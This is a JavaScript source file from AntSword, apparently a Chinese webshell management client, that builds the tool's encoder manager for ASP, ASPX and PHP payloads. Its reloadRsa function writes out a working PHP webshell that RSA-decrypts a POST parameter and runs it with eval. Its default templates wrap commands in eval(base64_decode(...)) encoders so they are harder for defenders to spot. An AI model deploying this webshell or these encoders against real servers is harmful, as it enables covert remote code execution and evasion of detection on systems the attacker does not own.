/**
 * 中国蚁剑::编码器管理
 * 创建：2017-05-30
 * 更新：2018-08-19
 * 作者：Virink <virink@outlook.com>
 * 作者：Medici.Yan <Medici.Yan@gmail.com>
 */

const LANG = antSword['language']['settings']['encoders'];
const LANG_T = antSword['language']['toastr'];
const fs = require('fs');
const path = require('path');
const NodeRSA = require('node-rsa');
const WIN = require("../../ui/window");

class Encoders {

  constructor(sidebar) {
    var that = this;
    this.encoders = antSword["encoders"];

    let keyPath = path.join(remote.process.env.AS_WORKDIR, `antData/`);
    this.rsa = {
      keyPath: {
        pub: `${keyPath}/key_rsa.pub`,
        pri: `${keyPath}/key_rsa`
      }
    }

    sidebar.addItem({
      id: 'encoders',
      text: `<i class="fa fa-file-code-o"></i> ${LANG['title']}`
    });

    that.cell = sidebar.cells('encoders');
    const toolbar = that.cell.attachToolbar();

    toolbar.loadStruct([
      {
        type: 'buttonSelect', text: LANG['toolbar']['new'], icon: 'plus-circle', id: 'new', openAll: true,
        options: [
          { id: 'new_asp', icon: 'file-code-o', type: 'button', text: "ASP" },
          { id: 'new_aspx', icon: 'file-code-o', type: 'button', text: "ASPX" },
          { id: 'new_php', icon: 'file-code-o', type: 'button', text: "PHP" },
          { type: 'separator' },
          { id: 'new_custom', icon: 'file-code-o', type: 'button', text: "Custom" },
          { type: 'separator' },
          { id: 'new_php_rsa', icon: 'file-code-o', type: 'button', text: "PHP RSA" }
        ]
      },
      { type: 'separator' },
      { type: 'button', text: LANG['toolbar']['edit'], icon: 'fa fa-edit', id: 'edit' },
      { type: 'button', text: LANG['toolbar']['delete'], icon: 'fa fa-trash-o', id: 'delete' },
      { type: 'separator' },
      { type: 'button', text: LANG['toolbar']['rsa'], icon: 'fa fa-key', id: 'rsa' },
      { type: 'separator' },
      { type: 'button', text: LANG['toolbar']['more'], icon: 'fa fa-chrome', id: 'more' },
    ]);

    toolbar.attachEvent("onClick", (id) => {
      switch (id) {
        case "new_asp":
          that.createEncoder(id);
          break;
        case "new_aspx":
          that.createEncoder(id);
          break;
        case "new_php":
        case "new_php_rsa":
          that.createEncoder(id);
          break;
        case "new_custom":
          that.createEncoder(id);
          break;
        case "edit":
          that.editEncoder();
          break;
        case "delete":
          that.deleteEncoder();
          break;
        case "rsa":
          that.rsaConfig();
          break;
        case "more":
          antSword.shell.openExternal("https://github.com/AntSwordProject/AwesomeEncoder");
          break;
      }
    });

    let grid = that.cell.attachGrid();
    grid.setHeader(`
      &nbsp;,
      ${LANG['grid']['ename']},
      ${LANG['grid']['etype']}
    `);
    grid.setColTypes("ro,edtxt,coro");
    grid.setColSorting('str,str,str');
    grid.setInitWidths("40,*,150");
    grid.setColAlign("center,left,center");
    grid.enableMultiselect(true);
    var combobox = grid.getCombo(2);
    combobox.put("asp", "ASP");
    combobox.put("aspx", "ASPX");
    combobox.put("php", "PHP");
    combobox.put("custom", "CUSTOM");

    grid.attachEvent("onEditCell", function (stage, rId, cInd, nValue, oValue) {
      // 2 编辑完成
      if (stage === 2) {
        nValue = nValue.toLocaleLowerCase();
        oValue = oValue.toLocaleLowerCase();
        if (nValue === oValue) { return; }
        var oename = grid.getRowAttribute(rId, "ename");
        var oepath = grid.getRowAttribute(rId, "epath");
        var oetype = grid.getRowAttribute(rId, "etype");
        oepath = oepath + ".js";
        switch (cInd) {
          case 1:
            // name
            if (!nValue.match(/^[a-zA-Z0-9_]+$/)) {
              toastr.error(LANG["message"]["ename_invalid"], LANG_T['error']);
              return
            }
            if (that._checkname(nValue, oetype)) {
              toastr.error(LANG['message']['ename_duplicate'], LANG_T['error']);
              return;
            }
            fs.renameSync(oepath, path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${oetype}/encoder/${nValue}.js`));
            toastr.success(LANG['message']["rename_success"], LANG_T["success"]);
            break
          case 2:
            // type
            if (nValue != "asp" && nValue != "aspx" && nValue != "php" && nValue != "custom") {
              toastr.error(LANG['message']["etype_error"], LANG_T['error']);
              return
            }
            if (that._checkname(oename, nValue)) {
              toastr.error(LANG['message']['ename_duplicate'], LANG_T['error']);
              return;
            }
            fs.renameSync(oepath, path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${nValue}/encoder/${oename}.js`));
            toastr.success(LANG['message']["retype_success"], LANG_T["success"]);
            break
        }
        that.syncencoders();
      }
    });
    grid.init();

    that.grid = grid;

    that.parseData();
  }

  // 创建新的编码器
  createEncoder(id) {
    let self = this;
    let idArr = id.split('_');
    let type = idArr[1];
    let rsa = idArr.length >= 3 ? '_rsa' : '';
    layer.prompt({
      value: `myencoder`,
      title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_encoder"]}`
    }, (value, i, e) => {
      value = value.toLocaleLowerCase();
      if (!value.match(/^[a-zA-Z0-9_]+$/)) {
        toastr.error(LANG["message"]["ename_invalid"], LANG_T['error']);
        return
      }
      if (self._checkname(value, type)) {
        toastr.error(LANG["message"]["ename_duplicate"], LANG_T['error']);
        layer.close(i);
        return
      }
      let savePath = path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${type}/encoder/${value}${rsa}.js`);

      fs.writeFileSync(savePath, rsa ? self.default_rsa_template : self.default_template);

      var ids = self.grid.getAllRowIds();
      let _id = 1;
      if (ids.length > 0) {
        _id = parseInt(ids[ids.length - 1]);
      }
      _id++;
      self.grid.addRow(_id, `${_id},${antSword.noxss(value)},${type}`);
      toastr.success(LANG["message"]["create_success"], LANG_T["success"]);
      self.cell.progressOff();
      layer.close(i);
      self.syncencoders();
    });
  }

  // 编辑选中的编码器代码
  editEncoder() {
    let self = this;
    // 获取选中ID列表
    let ids = self.grid.getSelectedId();
    if (!ids) {
      toastr.warning(LANG["message"]["edit_not_select"], LANG_T["warning"]);
      return
    }
    let _ids = ids.split(",");
    if (_ids.length !== 1) {
      toastr.warning(LANG["message"]["edit_only_single"], LANG_T["warning"]);
      return
    }
    let _id = _ids[0];
    const ename = self.grid.getRowAttribute(_id, 'ename');
    const epath = self.grid.getRowAttribute(_id, 'epath');
    let buff = fs.readFileSync(epath + ".js");
    let opt = {
      title: `${LANG["edit_win_title"]}: ${ename}`,
      width: 800,
      height: 600,
    };
    let _win = new WIN(opt);
    _win.win.centerOnScreen();
    _win.win.button('minmax').show();
    _win.win.button('minmax').enable();
    // _win.win.maximize();
    let toolbar = _win.win.attachToolbar();
    toolbar.loadStruct([
      { id: 'save', type: 'button', icon: 'save', text: LANG["toolbar"]['save'] },
      { type: 'separator' },
    ]);
    toolbar.attachEvent('onClick', (id) => {
      if (id === 'save') {
        // 保存代码
        let saveData = editor.session.getValue();
        if (!saveData) {
          toastr.warning(LANG["message"]["edit_null_value"], LANG_T["warning"]);
          return
        }
        fs.writeFileSync(epath + ".js", saveData);
        toastr.success(LANG["message"]["edit_save_success"], LANG_T["success"]);
      }
    });

    // 创建编辑器
    let editor = ace.edit(_win.win.cell.lastChild);
    editor.$blockScrolling = Infinity;
    editor.setTheme('ace/theme/tomorrow');
    editor.session.setMode(`ace/mode/javascript`);
    editor.session.setUseWrapMode(true);
    editor.session.setWrapLimitRange(null, null);
    editor.setOptions({
      fontSize: '14px',
      enableBasicAutocompletion: true,
      enableSnippets: true,
      enableLiveAutocompletion: true
    });
    // 编辑器快捷键
    editor.commands.addCommand({
      name: 'save',
      bindKey: {
        win: 'Ctrl-S',
        mac: 'Command-S'
      },
      exec: () => {
        toolbar.callEvent('onClick', ['save']);
      }
    });

    editor.session.setValue(buff.toString());
    // 定时刷新
    const inter = setInterval(editor.resize.bind(editor), 200);
    _win.win.attachEvent('onClose', () => {
      self.syncencoders();
      clearInterval(inter);
      return true;
    });
  }

  // 生成 RSA
  generateRsaKey(bit = 1024) {
    const key = new NodeRSA({ b: bit });
    let pubKey = key.exportKey('pkcs8-public-pem');
    let priKey = key.exportKey('pkcs1-private-pem');
    let keyPath = this.rsa.keyPath;
    fs.writeFileSync(keyPath.pub, pubKey);
    fs.writeFileSync(keyPath.pri, priKey);
    for (var _path in keyPath) {
      if (!fs.existsSync(keyPath[_path])) {
        toastr.error(LANG["message"]["rsa_save_error"], LANG_T["error"]);
        return false;
      }
    }
    toastr.success(LANG["message"]["rsa_save_success"], LANG_T["success"]);
    this.reloadRsa();
    return true;
  }

  // 重新读取 RSA
  reloadRsa() {
    let keyPath = this.rsa.keyPath;
    let pubKey = fs.existsSync(keyPath.pub) ? fs.readFileSync(keyPath.pub) : '';
    let priKey = fs.existsSync(keyPath.pri) ? fs.readFileSync(keyPath.pri) : '';
    this.rsa.form.setItemValue('public_key', pubKey);
    this.rsa.form.setItemValue('private_key', priKey);
    this.rsa.form.setItemValue('php_code', `<?php
$cmd = @$_POST['ant'];
$pk = <<<EOF
${pubKey}
EOF;
$cmds = explode("|", $cmd);
$pk = openssl_pkey_get_public($pk);
$cmd = '';
foreach ($cmds as $value) {
	if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
		$cmd .= $de;
	}
}
eval($cmd);`);
  }

  // 编辑选中的编码器代码
  rsaConfig() {
    let self = this;
    let opt = {
      title: LANG["rsa_config_win_title"],
      width: 800,
      height: 600,
    };
    let _win = new WIN(opt);
    _win.win.centerOnScreen();
    let toolbar = _win.win.attachToolbar();
    let form = _win.win.attachForm();
    self.rsa.form = form;
    toolbar.loadStruct([
      { id: 'generate', type: 'button', icon: 'repeat', text: LANG["toolbar"]['generate'] },
    ]);
    toolbar.attachEvent('onClick', (id) => {
      if (id === 'generate') {
        if (fs.existsSync(self.rsa.keyPath.pub) && fs.existsSync(self.rsa.keyPath.pri)) {
          layer.confirm(`${LANG['confirm']['generate']} `,
            {
              icon: 2,
              shift: 6,
              title: `${LANG['confirm']["generate"]} `,
            }, (_) => {
              layer.close(_);
              self.generateRsaKey();
            });
        } else {
          self.generateRsaKey();
        }
      }
    });
    form.loadStruct([
      {
        type: "settings",
        labelWidth: 750,
        inputWidth: 750,
        position: "label-top",
        labelLeft: 25,
        inputLeft: 25
      },
      {
        type: 'block',
        inputWidth: 'auto',
        offsetTop: 20,
        list: [{
          type: 'input',
          label: LANG['form']['public_key'],
          name: 'public_key',
          rows: 6,
          value: ''
        }, {
          type: 'input',
          label: LANG['form']['private_key'],
          name: 'private_key',
          rows: 15,
          value: ''
        }, {
          type: 'input',
          label: LANG['form']['php_code'],
          name: 'php_code',
          rows: 20,
          value: ''
        }]
      }], true);
    self.reloadRsa();
  }

  deleteEncoder() {
    let self = this;
    // 获取选中ID列表
    let ids = self.grid.getSelectedId();
    if (!ids) {
      toastr.warning(LANG["message"]["delete_not_select"], LANG_T["warning"]);
      return
    }
    let _ids = ids.split(",");
    layer.confirm(`${LANG['confirm']['delete'](_ids.length == 1 ? self.grid.getRowAttribute(_ids[0], "ename") : _ids.length)} `,
      {
        icon: 2,
        shift: 6,
        title: `${LANG["delete_title"]} `,
      }, (_) => {
        layer.close(_);
        _ids.map((_id) => {
          var epath = self.grid.getRowAttribute(_id, 'epath');
          fs.unlinkSync(epath + ".js");
        });
        toastr.success(LANG["message"]["delete_success"], LANG_T["success"]);
        self.syncencoders();
      });
  }

  get default_template() {
    return `/**
 * php::base64编码器
 * Create at: ${new Date().format("yyyy/MM/dd hh:mm:ss")}
 */

\'use strict\';

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data) => {
  // ##########    请在下方编写你自己的代码   ###################
  // 以下代码为 PHP Base64 样例

  // 生成一个随机变量名
  let randomID = \`_0x\${Math.random().toString(16).substr(2)}\`;
  // 原有的 payload 在 data['_']中
  // 取出来之后，转为 base64 编码并放入 randomID key 下
  data[randomID] = Buffer.from(data['_']).toString('base64');

  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
  data[pwd] = \`eval(base64_decode($_POST[\${randomID}]));\`;

  // ##########    请在上方编写你自己的代码   ###################

  // 删除 _ 原有的payload
  delete data['_'];
  // 返回编码器处理后的 payload 数组
  return data;
}`;
  }

  get default_rsa_template() {
    return `/**
 * php::RSA编码器
 * Create at: ${new Date().format("yyyy/MM/dd hh:mm:ss")}
 */

'use strict';

/*
 * @param  {String} pwd   连接密码
 * @param  {Array}  data  编码器处理前的 payload 数组
 * @return {Array}  data  编码器处理后的 payload 数组
 */
module.exports = (pwd, data, ext) => {
    let n = Math.ceil(data['_'].length / 80);
    let l = Math.ceil(data['_'].length / n);
    let r = []
    for (var i = 0; n > i; i++) {
        r.push(ext['rsa'].encryptPrivate(data['_'].substr(i * l, l), 'base64'));
    }
    data[pwd] = r.join("|");
    delete data['_'];
    return data;
}`;
  }
  // 检查 name 是否重复
  _checkname(name, t) {
    let tstr = ',' + antSword['encoders'][t].join(',') + ',';
    return tstr.indexOf("," + name + ",") != -1;
  }
  // 解析数据
  parseData() {
    let data = [];
    let self = this;
    let _id = 1;

    Object.keys(self.encoders).map((t) => {
      self.encoders[t].map(_ => {
        data.push({
          id: _id,
          ename: _,
          epath: path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${t}/encoder/${_}`),
          etype: t,
          data: [
            `<i class="fa fa-file-code-o"></i>`,
            antSword.noxss(_),
            t
          ]
        });
        _id++;
      });
    });

    self.grid.clearAll();
    self.grid.parse({
      'rows': data
    }, 'json');
  }

  // 同步到全局编码器
  syncencoders() {
    antSword['encoders'] = (function () {
      var encoders = { asp: [], aspx: [], php: [], custom: [] };
      var encoders_path = { asp: [], aspx: [], php: [], custom: [] };
      let userencoder_path = path.join(remote.process.env.AS_WORKDIR, 'antData/encoders');
      // 初始化
      !fs.existsSync(userencoder_path) ? fs.mkdirSync(userencoder_path) : null;
      ['asp', 'aspx', 'php', 'custom'].map((t) => {
        !fs.existsSync(path.join(userencoder_path, `${t}`)) ? fs.mkdirSync(path.join(userencoder_path, `${t}`)) : null;
        let t_path = path.join(userencoder_path, `${t}/encoder/`);
        !fs.existsSync(t_path) ? fs.mkdirSync(t_path) : null;

        let es = fs.readdirSync(t_path);
        if (es) {
          es.map((_) => {
            if (!_.endsWith(".js")) {
              return
            }
            encoders[t].push(_.slice(0, -3));
            encoders_path[t].push(path.join(t_path, _.slice(0, -3)));
          });
        }
        antSword["core"][t].prototype.user_encoders = encoders_path[t];
      });
      return encoders;
    })();
    this.encoders = antSword["encoders"];
    this.parseData();
  }
}
module.exports = Encoders;
